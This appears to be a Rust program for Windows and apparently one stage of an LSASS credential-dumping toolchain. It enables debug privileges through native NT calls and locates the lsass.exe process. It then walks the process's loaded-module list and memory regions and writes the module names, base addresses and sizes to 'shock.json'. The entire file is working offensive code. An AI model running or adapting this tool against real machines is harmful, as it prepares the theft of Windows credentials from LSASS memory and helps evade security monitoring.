use std::{
    ffi::c_void,
    ptr::{self, null_mut},
    fs::File,
    io::Write
};
use winapi::{
    shared::{
        minwindef::{DWORD, FALSE, MAX_PATH, ULONG},
        ntdef::{LUID, NTSTATUS, PWSTR, USHORT},
    },
    um::{
        handleapi::CloseHandle,
        winnt::{
            MEMORY_BASIC_INFORMATION, TOKEN_ADJUST_PRIVILEGES, TOKEN_QUERY,
            PAGE_NOACCESS, MEM_COMMIT, MAXIMUM_ALLOWED
        },
    },
};
use serde_json::json;


extern "system" {
    fn NtOpenProcessToken(ProcessHandle: HANDLE, DesiredAccess: DWORD, TokenHandle: *mut HANDLE) -> NTSTATUS;
    fn NtAdjustPrivilegesToken(TokenHandle: HANDLE, DisableAllPrivileges: BOOLEAN, NewState: *mut TOKEN_PRIVILEGES, BufferLength: DWORD, PreviousState: *mut TOKEN_PRIVILEGES, ReturnLength: *mut DWORD) -> NTSTATUS;
    fn NtReadVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, BufferSize: usize, NumberOfBytesRead: *mut usize) -> NTSTATUS;
    fn NtQueryInformationProcess(ProcessHandle: HANDLE, ProcessInformationClass: ULONG, ProcessInformation: PVOID, ProcessInformationLength: ULONG, ReturnLength: *mut ULONG) -> NTSTATUS;
    fn NtGetNextProcess(ProcessHandle: HANDLE, DesiredAccess: u32, HandleAttributes: u32, Flags: u32, NewProcessHandle: *mut HANDLE) -> NTSTATUS;
    fn NtQueryVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, MemoryInformationClass: MemoryInformationClass, MemoryInformation: PVOID, MemoryInformationLength: usize, ReturnLength: *mut usize) -> NTSTATUS;
}


const PROCESS_BASIC_INFORMATION_CLASS: ULONG = 0;
const PROCESS_BASIC_INFORMATION: ULONG = 0;
const STATUS_ACCESS_VIOLATION: i32 = 0xC0000005u32 as i32;
const STATUS_INVALID_PARAMETER: i32 = 0x8000000Du32 as i32;
const NT_SUCCESS: fn(NTSTATUS) -> bool = |status| status >= 0;
const MAX_MODULES: usize = 1024;
type HANDLE = *mut c_void;
type BOOLEAN = u8;
type PVOID = *mut c_void;


#[repr(C)]
struct TOKEN_PRIVILEGES {
    privilege_count: DWORD,
    privileges: [LUID_AND_ATTRIBUTES; 1],
}

#[repr(C)]
struct LUID_AND_ATTRIBUTES {
    luid: LUID,
    attributes: DWORD,
}

#[repr(C)]
#[derive(Debug, Clone)]
pub struct ModuleInformation {
    base_dll_name: [u8; MAX_PATH],
    full_dll_path: [u8; MAX_PATH],
    dll_base: PVOID, // dll_base: *mut c_void,
    size: i32,
}

impl Default for ModuleInformation {
    fn default() -> Self {
        ModuleInformation {
            base_dll_name: [0; MAX_PATH],
            full_dll_path: [0; MAX_PATH],
            dll_base: ptr::null_mut(),
            size: 0,
        }
    }
}

#[allow(dead_code)]
#[repr(C)]
struct UNICODE_STRING {
    length: USHORT,
    maximum_length: USHORT,
    buffer: PWSTR,
}

#[repr(C)]
struct TOKEN_PRIVILEGES_STRUCT {
    privilege_count: DWORD,
    luid: LUID,
    attributes: DWORD,
}

#[repr(u32)]
#[derive(Debug, Clone, Copy)]
pub enum MemoryInformationClass {
    MemoryBasicInformation = 0,
}


fn enable_debug_privileges() -> Result<(), String> {
    unsafe {
        let current_process: HANDLE = -1isize as HANDLE;
        let mut token_handle: HANDLE = null_mut();

        let status = NtOpenProcessToken(
            current_process as *mut std::ffi::c_void,
            TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES,
            &mut token_handle,
        );

        if !NT_SUCCESS(status) {
            return Err(format!(
                "[-] Error calling NtOpenProcessToken. NTSTATUS: 0x{:08X}",
                status
            ));
        }

        let mut token_privileges = TOKEN_PRIVILEGES_STRUCT {
            privilege_count: 1,
            luid: LUID { LowPart: 20, HighPart: 0 },
            attributes: 0x00000002,
        };

        let status = NtAdjustPrivilegesToken(
            token_handle,
            FALSE as BOOLEAN,
            &mut token_privileges as *mut _ as *mut TOKEN_PRIVILEGES,
            std::mem::size_of::<TOKEN_PRIVILEGES>() as DWORD,
            null_mut(),
            null_mut(),
        );

        if !NT_SUCCESS(status) {
            CloseHandle(token_handle as *mut winapi::ctypes::c_void); // CloseHandle(token_handle);
            return Err(format!(
                "[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x{:08X}",
                status
            ));
        }

        CloseHandle(token_handle as *mut winapi::ctypes::c_void); // CloseHandle(token_handle);
        println!("[+] Debug privileges enabled successfully.");
        Ok(())
    }
}


fn nt_success(status: NTSTATUS) -> bool {
    status >= 0
}


unsafe fn read_remote_int_ptr(process: HANDLE, address: PVOID) -> Option<PVOID> {
    let mut buffer = [0u8; 8];
    let mut bytes_read = 0usize;
    let status = NtReadVirtualMemory(
        process,
        address,
        buffer.as_mut_ptr() as PVOID,
        buffer.len(),
        &mut bytes_read,
    );

    if status != 0 && status != STATUS_ACCESS_VIOLATION && status != STATUS_INVALID_PARAMETER {
        eprintln!(
            "[-] Error calling NtReadVirtualMemory (ReadRemoteIntPtr). NTSTATUS: 0x{:X} reading address {:p}",
            status, address
        );
        return None;
    }

    let value = *(buffer.as_ptr() as *const usize) as PVOID;
    Some(value)
}


unsafe fn read_remote_wstr(process: HANDLE, address: PVOID) -> String {
    let mut buffer = [0u8; 256];
    let mut bytes_read = 0usize;
    let status = NtReadVirtualMemory(
        process,
        address,
        buffer.as_mut_ptr() as PVOID,
        buffer.len(),
        &mut bytes_read,
    );

    if status != 0 && status != STATUS_ACCESS_VIOLATION && status != STATUS_INVALID_PARAMETER {
        eprintln!(
            "[-] Error calling NtReadVirtualMemory (ReadRemoteWStr). NTSTATUS: 0x{:X} reading address {:p}",
            status, address
        );
    }

    let mut output = Vec::new();
    for i in (0..buffer.len() - 1).step_by(2) {
        let wchar = u16::from_le_bytes([buffer[i], buffer[i + 1]]);
        if wchar == 0 {
            break;
        }
        output.push(wchar);
    }

    String::from_utf16_lossy(&output)
}


unsafe fn get_proc_name_from_handle(process: HANDLE) -> Option<String> {
    let peb_offset = 0x8;
    let processparameters_offset = 0x20;
    let commandline_offset = 0x68;

    let mut pbi_buffer = [0u8; 48];
    let mut return_length: ULONG = 0;

    let status = NtQueryInformationProcess(
        process,
        PROCESS_BASIC_INFORMATION_CLASS,
        pbi_buffer.as_mut_ptr() as PVOID,
        pbi_buffer.len() as ULONG,
        &mut return_length,
    );

    if !nt_success(status) {
        eprintln!(
            "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x{:08X}",
            status
        );
        return None;
    }

    let peb_address_ptr = *(pbi_buffer.as_ptr().add(peb_offset) as *const *const c_void);
    let process_parameters_ptr = (peb_address_ptr as usize + processparameters_offset) as PVOID;
    let process_parameters = read_remote_int_ptr(process, process_parameters_ptr)?;

    let commandline_ptr = (process_parameters as usize + commandline_offset) as PVOID;
    let commandline = read_remote_int_ptr(process, commandline_ptr)?;
    Some(read_remote_wstr(process, commandline))
}


fn to_lowercase_ascii(s: &mut String) {
    *s = s.to_ascii_lowercase();
}


unsafe fn get_process_by_name(target_name: &str) -> Option<HANDLE> {
    let mut handle: HANDLE = null_mut();

    while nt_success(NtGetNextProcess(handle, MAXIMUM_ALLOWED, 0, 0, &mut handle)) {
        if let Some(mut name) = get_proc_name_from_handle(handle) {
            to_lowercase_ascii(&mut name);
            if name == target_name {
                return Some(handle);
            }
        }
    }

    None
}


fn add_module(list: &mut Vec<ModuleInformation>, new_module: ModuleInformation) {
    list.push(new_module);
}


unsafe fn custom_get_module_handle(h_process: HANDLE) -> Result<Vec<ModuleInformation>, String> {
    let mut module_list = Vec::with_capacity(MAX_MODULES);
    const PEB_OFFSET: usize = 0x8;
    const LDR_OFFSET: usize = 0x18;
    const IN_INITIALIZATION_ORDER_MODULE_LIST_OFFSET: usize = 0x30;
    const FLINK_DLLBASE_OFFSET: usize = 0x10;
    const FLINK_BUFFER_FULLDLLNAME_OFFSET: usize = 0x30;
    const FLINK_BUFFER_OFFSET: usize = 0x40;

    let mut pbi_byte_array = [0u8; 48];
    let pbi_addr = pbi_byte_array.as_mut_ptr() as PVOID;

    let mut return_length = 0;
    let ntstatus = NtQueryInformationProcess(
        h_process,
        PROCESS_BASIC_INFORMATION,
        pbi_addr,
        48,
        &mut return_length,
    );

    if ntstatus != 0 {
        return Err(format!("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x{:08X}", ntstatus));
    }

    let peb_pointer = (pbi_addr as usize + PEB_OFFSET) as PVOID;
    let peb_address = *(peb_pointer as *const PVOID);

    println!("[+] PEB Address: \t0x{:X}", peb_address as usize);

    let ldr_pointer = (peb_address as usize + LDR_OFFSET) as PVOID;
    let ldr_address = match read_remote_int_ptr(h_process, ldr_pointer) {
        Some(addr) => addr,
        None => return Err("Failed to read LDR address".to_string()),
    };

    let in_initialization_order_module_list = (ldr_address as usize + IN_INITIALIZATION_ORDER_MODULE_LIST_OFFSET) as PVOID;
    println!("[+] Ldr Pointer: \t0x{:X}", ldr_pointer as usize);
    println!("[+] Ldr Address: \t0x{:X}", ldr_address as usize);

    let mut dll_base: PVOID = 1337 as PVOID;
    let mut next_flink = match read_remote_int_ptr(h_process, in_initialization_order_module_list) {
        Some(flink) => flink,
        None => return Err("Failed to read module list".to_string()),
    };

    while !dll_base.is_null() {
        // Corrección clave: Ajustar el puntero SIN leer memoria
        let current_entry = next_flink as usize - 0x10;
        
        // Leer campos desde la entrada actual
        dll_base = match read_remote_int_ptr(
            h_process, 
            ((next_flink as usize) + FLINK_DLLBASE_OFFSET) as PVOID
        ) {
            Some(base) => base,
            None => break,
        };

        let buffer = match read_remote_int_ptr(
            h_process, 
            (next_flink as usize + FLINK_BUFFER_OFFSET) as PVOID
        ) {
            Some(buf) => buf,
            None => break,
        };

        let base_dll_name = read_remote_wstr(h_process, buffer);

        // Create new ModuleInformation
        let mut new_module = ModuleInformation::default();
        new_module.dll_base = dll_base;
        
        // Copy base DLL name
        let base_name_bytes = base_dll_name.as_bytes();
        let copy_len = base_name_bytes.len().min(MAX_PATH - 1);
        new_module.base_dll_name[..copy_len].copy_from_slice(&base_name_bytes[..copy_len]);
        
        // Full DLL Path
        let full_dll_name_addr = match read_remote_int_ptr(
            h_process, 
            (next_flink as usize + FLINK_BUFFER_FULLDLLNAME_OFFSET) as PVOID
        ) {
            Some(addr) => addr,
            None => break,
        };
        
        let full_dll_name = read_remote_wstr(h_process, full_dll_name_addr);
        
        // Copy full DLL path
        let full_path_bytes = full_dll_name.as_bytes();
        let copy_len = full_path_bytes.len().min(MAX_PATH - 1);
        new_module.full_dll_path[..copy_len].copy_from_slice(&full_path_bytes[..copy_len]);

        if !dll_base.is_null() {
            add_module(&mut module_list, new_module);
        }

        next_flink = match read_remote_int_ptr(
            h_process, 
            (current_entry + 0x10) as PVOID
        ) {
            Some(flink) => flink,
            None => break,
        };
        // println!("[+] Processing module {}", counter);
    }

    Ok(module_list)
}

/*
pub fn find_module_by_name(
    module_list: &[ModuleInformation],
    aux_name: &[u8],
) -> Option<ModuleInformation> {
    module_list.iter().find(|module| module.base_dll_name == aux_name).cloned()
}*/

pub fn find_module_by_name(
    module_list: &[ModuleInformation],
    aux_name: &[u8],
) -> ModuleInformation {
    module_list
        .iter()
        .find(|module| module.base_dll_name == aux_name)
        .cloned()
        .unwrap_or_default()
}


/*
pub fn find_module_index_by_name(
    module_list: &[ModuleInformation],
    aux_name: &[u8],
) -> Option<usize> {
    module_list.iter().position(|module| module.base_dll_name == aux_name)
}
*/
pub fn find_module_index_by_name(
    module_list: &[ModuleInformation],
    aux_name: &[u8],
) -> usize {
    module_list.iter().position(|module| module.base_dll_name == aux_name).unwrap_or_default()
}


unsafe fn shock(filename: &str) -> Result<(), String> {
    enable_debug_privileges()?;    
    let h_process = match get_process_by_name("c:\\windows\\system32\\lsass.exe") {
        Some(h) => h,
        None => {
            eprintln!("[-] Process not found.");
            return Err("Process not found".to_string());
        }
    };
    
    // Call the function and handle the result
    let mut module_list = unsafe { custom_get_module_handle(h_process) };

    let proc_max_address_l: u64 = 0x7FFFFFFEFFFF;
    let mut mem_address: PVOID = std::ptr::null_mut();
    let mut aux_size: i32 = 0;
    let mut aux_name: [u8; MAX_PATH] = [0; MAX_PATH];

    // Loop through the memory regions
    while (mem_address as u64) < proc_max_address_l {
        let mut mbi: MEMORY_BASIC_INFORMATION = unsafe { std::mem::zeroed() };
        let mut return_size: usize = 0;

        // If you defined the enum manually (Option 1 from previous answer):
        let ntstatus = unsafe {
            NtQueryVirtualMemory(
                h_process,
                mem_address,
                MemoryInformationClass::MemoryBasicInformation,  // Use enum variant instead of 0
                &mut mbi as *mut _ as PVOID,
                std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
                &mut return_size,
            )
        };
        
        if ntstatus != 0 {
            println!("[-] Error calling NtQueryVirtualMemory. NTSTATUS: 0x{:x}", ntstatus);
        }

        // If readable and committed --> Get information
        if mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT {
            let modules = match module_list.as_mut() {
                Ok(modules) => modules,
                Err(e) => {
                    eprintln!("Failed to get module list: {}", e);
                    return Ok(());
                }
            };
            // let module_counter = modules.len();
            
            let module_found = find_module_by_name(modules, &aux_name);
            // println!("[+] 0x{:X}\tmbi.Protect: 0x{:x}\tmbi.State: 0x{:x}\tmbi.RegionSize: 0x{:x}", mem_address as usize, mbi.Protect, mbi.State, mbi.RegionSize);
            
            if mbi.RegionSize == 0x1000 {
                // println!("{}", aux_size);
                // println!("{}", String::from_utf8_lossy(&aux_name[..aux_name.iter().position(|&x| x == 0).unwrap_or(aux_name.len())]));
                // println!("[+] 0x{:X}\tmbi.Protect: 0x{:x}\tmbi.State: 0x{:x}\tmbi.RegionSize: 0x{:x}", mem_address as usize, mbi.Protect, mbi.State, mbi.RegionSize);

                if mbi.BaseAddress != module_found.dll_base as *mut _ {
                    let aux_index = find_module_index_by_name(modules, &aux_name);
                    let mut updated_module = module_found.clone();
                    updated_module.size = aux_size;
                    modules[aux_index] = updated_module;
                }

                // Buscar si la dirección actual corresponde a algún módulo
                for k in 0..(modules.len()) {
                    if let Some(module) = modules.get(k) {
                        if mbi.BaseAddress == module.dll_base as *mut _ {
                            // Actualizar aux_name y aux_size
                            aux_name.copy_from_slice(&module.base_dll_name);
                            aux_size = mbi.RegionSize as i32;
                            break;
                        }
                    }
                }
            } else {
                // Incrementar tamaño si no es una nueva región
                aux_size += mbi.RegionSize as i32;
            }

        }
        
        // Move to next memory region
        mem_address = unsafe {
            (mbi.BaseAddress as *mut u8).add(mbi.RegionSize) as PVOID
        };
    }

    match module_list {
        Ok(ref modules) => {
            println!("[+] Number of modules:\t{}", modules.len());
            
            // Create a vector to hold all JSON objects
            let mut json_modules = Vec::new();

            for module in modules {
                let name = module.base_dll_name.iter()
                    .take_while(|&&c| c != 0)
                    .map(|&c| c as char)
                    .collect::<String>();
                let full_dll = module.full_dll_path.iter()
                    .take_while(|&&c| c != 0)
                    .map(|&c| c as char)
                    .collect::<String>();
                let base = module.dll_base;
                let size = module.size;

                // Create JSON object for this module
                let item = json!({
                    "field0": name,
                    "field1": full_dll,
                    "field2": format!("0x{:X}", base as usize),
                    "field3": size
                });

                json_modules.push(item);
            }

            // Single-line JSON output
            let json_str = serde_json::to_string(&json_modules).unwrap();
            // let filename = "shock.json";
            let mut file = File::create(filename).expect("Failed to create file");
            file.write_all(json_str.as_bytes()).expect("Failed to write to file");
            println!("[+] File {} generated correctly", filename);
        }
        Err(ref e) => {
            eprintln!("[-] Error enumerating modules: {}", e);
        }
    }

    Ok(())
}


fn main() {
    unsafe {
        let filename = "shock.json";
        if let Err(e) = shock(filename) {
            eprintln!("Error: {}", e);
        }
    }
}